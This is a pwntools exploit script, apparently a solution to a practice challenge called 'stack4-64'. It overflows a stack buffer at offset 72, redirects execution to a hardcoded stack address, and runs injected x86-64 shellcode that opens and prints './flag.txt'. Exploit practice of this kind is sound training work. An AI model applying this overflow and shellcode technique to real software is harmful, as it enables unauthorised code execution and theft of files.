from pwn import *
import sys

context.binary = "./stack4-64"
context.log_level = "debug"
p = process('./stack4-64')


offset = 72
nops = b"\x90" *32
code = asm('''

    push 0x7478
    mov rax, 0x742e67616c662f2e
    push rax
    mov eax, 2
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    syscall

    mov rsi, rax
    mov eax, 40
    mov edi, 1
    xor edx, edx
    mov r10, 0xff
    syscall

    mov eax, 60
    syscall
''')

stack_address = 0x00007fffffffe4f0 

p.sendline(flat({offset: stack_address + offset + 8 }, code))
p.recvall()
p.wait()